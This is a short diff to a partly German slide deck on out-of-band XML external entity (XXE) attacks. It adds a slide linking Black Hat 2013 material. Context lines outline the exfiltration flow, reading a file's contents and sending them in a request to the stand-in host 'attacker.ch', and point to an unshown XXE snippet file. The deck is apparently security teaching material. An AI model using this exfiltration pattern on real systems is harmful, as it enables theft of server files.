@@ -460,6 +460,10 @@ Note:
     - Aufruf getFile (hole Datei Inhalt)
     - Request "attacker.ch/"+"getFile=Inhalt"
 
++++?image=/res/xxeO10.png&size=cover
+### More on OOB XXE
+[Black Hat 13 (slides)](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
+
 +++?code=/res/snippets/oob-xxe.xml&lang=xml&title=Out of band XXE (XML)
 @[1-7]
 @[9-16]
